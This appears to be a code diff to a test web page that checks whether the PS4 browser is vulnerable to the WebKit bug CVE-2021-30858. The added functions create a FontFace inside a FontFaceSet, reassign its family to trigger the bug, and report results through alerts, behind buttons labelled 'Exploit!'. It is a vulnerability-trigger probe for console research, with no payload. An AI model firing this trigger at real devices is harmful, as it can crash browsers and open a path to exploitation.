@@ -20,17 +20,34 @@
     <script>
 
         async function testwebkit() {
-
-            let font = new FontFace("font1", '', {});
-
+            try{
+            alert("Testing CVE-2021-30858 on PS4 Browser.. Press OK to check bug API!!!");
+            let font = new FontFace('font1', 'url()',{});
+            alert("FontFace(). OK!!");
             var fontFaceSet = new FontFaceSet([font]);
-            alert("if this alert is loaded, exploit work");
-            font.family = "font2";
-            //do something after the font is loaded
-
-            alert("webkit exploit patched !");
+            alert("FontFaceSet(). OK!!");
             
+            font.family = 'font2';
+            alert("CVE-2021-30858 Webkit exploit bug.. FontFaceSet() and FontFace() are available on PS4 Browser :P!!");
+              }
+            catch(e){
+                alert(e);
+            }
         }
+
+        async function testwebkit2() {
+            try{
+            alert("Testing CVE-2021-30858 on PS4 Browser.. Rev3.\n This should not give you any 'Memory Errors'.\n If 'Bug Patched' Msgs or 'Memory Error Msg' is show means this bug does not work on your current FW and has been patched!!!\nIf you get 'The String did not match the expected pattern it's OK, Means it's working as expected! :P '");
+            let font = new FontFace('font1','',{});
+            var fontFaceSet = new FontFaceSet([font]);
+            font.family = 'font2';
+            alert("Bug Patched :(");
+               }
+            catch(e){
+                alert(e);
+            }
+}
+
 
     </script>
 
@@ -39,7 +56,8 @@
         <p2>webkit test 5 for hash (tkshi)</p2>
         <img src="https://wallpapercrafter.com/th800/76813-mr-robot-tv-shows-hd-4k.jpg">
         <br>
-        <button class="button" onclick="testwebkit()">Exploit!</button>
+        <button class="button" onclick="testwebkit()">CVE ON PS4 Browser 8.XX</button>
+            <button class="button" onclick="testwebkit2()">Exploit!</button>
         </center>
     </body>
 
